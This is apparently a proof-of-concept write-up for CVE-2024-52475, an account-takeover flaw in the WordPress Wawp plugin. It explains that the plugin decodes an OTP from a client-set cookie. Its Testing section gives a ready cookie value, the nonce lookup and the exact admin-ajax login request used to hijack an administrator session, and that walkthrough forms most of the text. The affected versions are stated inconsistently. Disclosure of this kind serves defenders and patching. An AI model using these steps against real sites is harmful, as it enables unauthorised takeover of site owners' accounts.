## (CVE-2024-52475) WordPress Wawp Plugin <= 3.0.17 is vulnerable to Broken Authentication (Account takeover)

### **Disclaimer!**
The information provided in this document regarding for **CVE-2024-52475** is for learning and educational purposes only. We do not encourage or authorize the use of this information for any detrimental purposes, including but not limited to exploitation, system tampering, or other illegal activities.

We emphasize the importance of ethics in the exploration and understanding of security vulnerabilities. Please remember that use of this information should be done responsibly and in accordance with applicable laws. Any actions taken using this information are the sole responsibility of the user.

By using this material, you agree not to misuse the information provided, and you take full responsibility for any consequences that may arise from the use of such information.

### **Introduction**
After browsing some sources and related code about this CVE, I found some oddities and flaws in the class-login.php file of the Wawp Plugin at version 3.0.17 onwards. The flaw is in lines 252 to 257 where the code decodes the OTP from cookie 'wc_log_awp'. That allows someone irresponsible to set the cookie manually via DevTools or otherwise.
![1.jpg](1.jpg)

### **Testing**
 1. Set cookie 'wc_log_awp' manually from DevTools, with this value 'VFZSSmVrMVVUWGc9' decoded: (123131)
 2. Find the login nonce at home/login page
 ![1.jpg](2.jpg) or ![1.jpg](3.jpg)
 3. And go to this this url directly
     ```url
    http://wordpress.test/wp-admin/admin-ajax.php?action=awp_login&nonce=LOGIN_NONCE&code=123131&user=USER_ID
      ```
 4. If the response is like this, the exploit is successful
  ![1.jpg](4.jpg)
 5. Check cookies admin from DevTools, and go to /wp-admin
  ![1.jpg](5.jpg)
  
### Buy me a coffe:
 - [saweria.co](https://saweria.co/ubaii)
 - [buymeacoffee.com](https://buymeacoffee.com/ubaii)
 - [trakteer.id](https://trakteer.id/ubaii)
 
### Refference:
[https://patchstack.com/database/vulnerability/automation-web-platform/wordpress-wawp-plugin-3-0-18-account-takeover-vulnerability](https://patchstack.com/database/vulnerability/automation-web-platform/wordpress-wawp-plugin-3-0-18-account-takeover-vulnerability)

### Thanks To:
Allah, Muhammad SAW, stealthcopter, Markdown Monster, my family, you?